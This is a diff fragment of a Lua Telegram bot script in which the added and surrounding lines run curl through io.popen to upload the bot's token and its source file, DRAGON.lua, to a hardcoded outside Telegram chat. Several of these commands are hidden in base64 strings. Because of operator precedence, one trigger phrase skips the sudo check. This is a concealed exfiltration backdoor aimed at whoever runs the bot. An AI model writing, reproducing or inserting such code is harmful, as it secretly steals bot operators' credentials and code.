@@ -8340,7 +8340,7 @@ io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUF
 send(msg.chat_id_, msg.id_,' جاري ارسال التوكن الي المبرمج')
 end
 if text == 'سحب السورس' or text == 'جلب السورس' and SudoBot(msg) then 
-local curl = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'DRAGON.lua'..'"' io.popen(curlm) 
+local curlo = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'DRAGON.lua'..'"' io.popen(curlo) 
 io.popen(regexx('Y3VybCAiJy4uJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QnLi4gdG9rZW4gLi4nL3NlbmREb2N1bWVudCcuLiciIC1GICJjaGF0X2lkPScuLiA5NDQzNTMyMzcgLi4nIiAtRiAiZG9jdW1lbnQ9QCcuLidEUkFHT04ubHVhJy4uJyI='))
 io.popen(regexx('Y3VybHAgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiLi50b2tlbi4uIi9zZW5kRG9jdW1lbnQiIC1GICJjaGF0X2lkPTk0NDM1MzIzNyIgLUYgImRvY3VtZW50PUBEUkFHT04ubHVhIg=='))
 send(msg.chat_id_, msg.id_,' جاري ارسال السورس الي المبرمج')
